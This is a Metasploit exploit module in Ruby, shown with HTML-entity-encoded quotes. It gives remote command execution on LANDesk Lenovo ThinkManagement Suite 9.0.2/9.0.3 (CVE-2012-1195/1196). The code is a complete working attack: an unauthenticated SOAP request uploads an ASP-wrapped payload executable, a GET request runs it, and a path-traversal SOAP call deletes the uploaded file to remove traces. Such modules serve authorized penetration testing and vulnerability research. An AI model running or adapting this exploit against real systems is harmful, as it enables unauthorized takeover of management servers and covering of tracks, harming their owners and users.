# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::EXE
 
    def initialize
        super(
            &#039;Name&#039;        => &#039;LANDesk Lenovo ThinkManagement Console Remote Command Execution&#039;,
            &#039;Description&#039;    => %q{
                    This module can be used to execute a payload on LANDesk Lenovo
                ThinkManagement Suite 9.0.2 and 9.0.3.
 
                The payload is uploaded as an ASP script by sending a specially crafted
                SOAP request to "/landesk/managementsuite/core/core.anonymous/ServerSetup.asmx"
                , via a "RunAMTCommand" operation with the command &#039;-PutUpdateFileCore&#039;
                as the argument.
 
                After execution, the ASP script with the payload is deleted by sending
                another specially crafted SOAP request to "WSVulnerabilityCore/VulCore.asmx"
                via a "SetTaskLogByFile" operation.
            },
            &#039;Author&#039;      => [
                &#039;Andrea Micalizzi&#039;, # aka rgod - Vulnerability Discovery and PoC
                &#039;juan vazquez&#039; # Metasploit module
            ],
            &#039;Version&#039;     => &#039;$Revision: $&#039;,
            &#039;Platform&#039;    => &#039;win&#039;,
            &#039;References&#039;  =>
                [
                    [&#039;CVE&#039;, &#039;2012-1195&#039;],
                    [&#039;CVE&#039;, &#039;2012-1196&#039;],
                    [&#039;OSVDB&#039;, &#039;79276&#039;],
                    [&#039;OSVDB&#039;, &#039;79277&#039;],
                    [&#039;BID&#039;, &#039;52023&#039;],
                    [&#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/18622/&#039;],
                    [&#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/18623/&#039;]
                ],
            &#039;Targets&#039;     =>
                [
                    [ &#039;LANDesk Lenovo ThinkManagement Suite 9.0.2 / 9.0.3 / Microsoft Windows Server 2003 SP2&#039;, { } ],
                ],
            &#039;DefaultTarget&#039;  => 0,
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => &#039;Feb 15 2012&#039;
        )
 
        register_options(
            [
                OptString.new(&#039;PATH&#039;, [ true,  "The URI path of the LANDesk Lenovo ThinkManagement Console", &#039;/&#039;])
            ], self.class)
    end
 
    def exploit
 
        peer = "#{rhost}:#{rport}"
 
        # Generate the ASP containing the EXE containing the payload
        exe = generate_payload_exe
        asp = Msf::Util::EXE.to_exe_asp(exe)
 
        # htmlentities like encoding
        asp = asp.gsub("&", "&").gsub("\"", """).gsub("&#039;", "&#039;").gsub("<", "<").gsub(">", ">")
 
        uri_path = (datastore[&#039;PATH&#039;][-1,1] == "/" ? datastore[&#039;PATH&#039;] : datastore[&#039;PATH&#039;] + "/")
        upload_random = rand_text_alpha(rand(6) + 6)
        upload_xml_path = "ldlogon\\#{upload_random}.asp"
 
        soap = <<-eos
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
        <RunAMTCommand xmlns="http://tempuri.org/">
            <Command>-PutUpdateFileCore</Command>
            <Data1>#{rand_text_alpha(rand(4) + 4)}</Data1>
            <Data2>#{upload_xml_path}</Data2>
            <Data3>#{asp}</Data3>
            <ReturnString>#{rand_text_alpha(rand(4) + 4)}</ReturnString>
        </RunAMTCommand>
    </soap:Body>
</soap:Envelope>
        eos
 
        #
        # UPLOAD
        #
        attack_url = uri_path + "landesk/managementsuite/core/core.anonymous/ServerSetup.asmx"
        print_status("#{peer} - Uploading #{asp.length} bytes through #{attack_url}...")
 
        res = send_request_cgi({
            &#039;uri&#039;          => attack_url,
            &#039;method&#039;       => &#039;POST&#039;,
            &#039;ctype&#039;        => &#039;text/xml; charset=utf-8&#039;,
            &#039;headers&#039;   => {
                    &#039;SOAPAction&#039;     => "\"http://tempuri.org/RunAMTCommand\"",
                },
            &#039;data&#039;         => soap,
        }, 20)
 
        if (! res)
            print_status("#{peer} - Timeout: Trying to execute the payload anyway")
        elsif (res.code < 200 or res.code >= 300)
            print_error("#{peer} - Upload failed on #{attack_url} [#{res.code} #{res.message}]")
            return
        end
 
        #
        # EXECUTE
        #
        upload_path = uri_path + "ldlogon/#{upload_random}.asp"
        print_status("#{peer} - Executing #{upload_path}...")
 
        res = send_request_cgi({
            &#039;uri&#039;          =>  upload_path,
            &#039;method&#039;       => &#039;GET&#039;
        }, 20)
 
        if (! res)
            print_error("#{peer} - Execution failed on #{upload_path} [No Response]")
            return
        end
 
        if (res.code < 200 or res.code >= 300)
            print_error("#{peer} - Execution failed on #{upload_path} [#{res.code} #{res.message}]")
            return
        end
 
 
        #
        # DELETE
        #
        soap = <<-eos
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
        <SetTaskLogByFile xmlns="http://tempuri.org/">
            <computerIdn>1</computerIdn>
            <taskid>1</taskid>
            <filename>../#{upload_random}.asp</filename>
            </SetTaskLogByFile>
    </soap:Body>
</soap:Envelope>
        eos
 
        attack_url = uri_path + "WSVulnerabilityCore/VulCore.asmx"
        print_status("#{peer} - Deleting #{upload_path} through #{attack_url}...")
 
        res = send_request_cgi({
            &#039;uri&#039;          => attack_url,
            &#039;method&#039;       => &#039;POST&#039;,
            &#039;ctype&#039;        => &#039;text/xml; charset=utf-8&#039;,
            &#039;headers&#039;      => {
                    &#039;SOAPAction&#039;     => "\"http://tempuri.org/SetTaskLogByFile\"",
                },
            &#039;data&#039;         => soap,
        }, 20)
 
        if (! res)
            print_error("#{peer} - Deletion failed at #{attack_url} [No Response]")
            return
        elsif (res.code < 200 or res.code >= 300)
            print_error("#{peer} - Deletion failed at #{attack_url} [#{res.code} #{res.message}]")
            return
        end
 
        handler
    end
 
end



